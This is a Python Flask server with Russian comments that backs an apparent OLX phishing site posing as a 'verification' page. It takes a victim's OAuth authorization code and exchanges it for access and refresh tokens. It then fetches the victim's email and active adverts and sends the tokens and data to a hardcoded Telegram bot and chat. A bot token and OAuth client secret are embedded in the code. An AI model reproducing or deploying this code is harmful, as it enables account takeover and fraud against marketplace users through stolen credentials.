from flask import Flask, request, jsonify, send_from_directory
import requests
import os

app = Flask(__name__)

# ---- ПЕРЕМЕННЫЕ ----
TG_TOKEN = os.environ.get("TG_TOKEN", "8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw")
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003455979409")
CLIENT_ID = os.environ.get("CLIENT_ID", "202421")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf")
REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://verif-olx-com-phi.vercel.app/")

# ---- Функция отправки сообщений в Telegram ----
def send_telegram_message(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={
                "chat_id": TG_CHAT_ID, 
                "text": msg, 
                "parse_mode": "HTML", 
                "disable_web_page_preview": True
            },
            timeout=10
        )
    except Exception as e:
        print("Telegram error:", e)

# ---- Главная страница ----
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# ---- Получение токена OLX через OAuth ----
@app.route('/get_token', methods=['POST'])
def get_token():
    data = request.get_json(silent=True) or {}
    code = data.get('code')

    if not code:
        return jsonify({"error": "No code"}), 400

    token_url = 'https://www.olx.ua/api/open/oauth/token'
    
    payload = {
        'grant_type': 'authorization_code',
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'scope': 'read write v2'  
    }

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Version': '2.0',
        'Accept': 'application/json'
    }

    try:
        # 1. Получаем токены
        response = requests.post(token_url, data=payload, headers=headers, timeout=15)
        
        if response.status_code == 200:
            res_json = response.json()
            access = res_json.get('access_token')
            refresh = res_json.get('refresh_token')

            # --- СБОР ДАННЫХ ПОСЛЕ АВТОРИЗАЦИИ ---
            auth_headers = {
                "Authorization": f"Bearer {access}",
                "Version": "2.0",
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0"
            }

            # А) Получаем Email
            email = "Не удалось получить"
            try:
                user_req = requests.get("https://www.olx.ua/api/open/users/me", headers=auth_headers, timeout=7)
                if user_req.status_code == 200:
                    u_json = user_req.json()
                    # Проверяем, лежат данные в ключе 'data' или в корне
                    u_data = u_json.get('data', u_json)
                    email = u_data.get('email', 'Email скрыт')
                else:
                    email = f"Ошибка запроса ({user_req.status_code})"
            except Exception as e:
                email = f"Ошибка: {str(e)[:30]}"

            # Б) Получаем активные объявления
            ads_info = "Объявлений не найдено"
            try:
                ads_req = requests.get(
                    "https://www.olx.ua/api/open/adverts", 
                    headers=auth_headers, 
                    params={"status": "active"}, 
                    timeout=7
                )
                if ads_req.status_code == 200:
                    a_json = ads_req.json()
                    ads_data = a_json.get('data', [])
                    if ads_data:
                        links = []
                        for ad in ads_data[:10]: # Лимит 10 ссылок
                            title = ad.get('title', 'Без названия')
                            url = ad.get('url', '#')
                            links.append(f"• <a href='{url}'>{title}</a>")
                        
                        ads_info = "\n".join(links)
                        if len(ads_data) > 10:
                            ads_info += f"\n<i>...и еще {len(ads_data)-10} шт.</i>"
                else:
                    ads_info = f"Ошибка запроса ({ads_req.status_code})"
            except Exception as e:
                ads_info = f"Ошибка при поиске: {str(e)[:30]}"

            # Формируем итоговый лог для Telegram
            msg = (
                f"🚀 <b>НОВЫЙ OLX АВТОРИЗАЦИЯ</b>\n\n"
                f"👤 <b>Email:</b> <code>{email}</code>\n\n"
                f"🔑 <b>Access:</b> <code>{access}</code>\n\n"
                f"🔄 <b>Refresh:</b> <code>{refresh}</code>\n\n"
                f"📦 <b>Активные объявления:</b>\n{ads_info}"
            )
            
            send_telegram_message(msg)
            return jsonify(res_json), 200
        else:
            error_text = response.text
            send_telegram_message(f"❌ <b>Ошибка авторизации OLX:</b> {response.status_code}\n<code>{error_text[:200]}</code>")
            return jsonify({"error": error_text}), response.status_code

    except Exception as e:
        send_telegram_message(f"💥 <b>Критическая ошибка:</b> {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
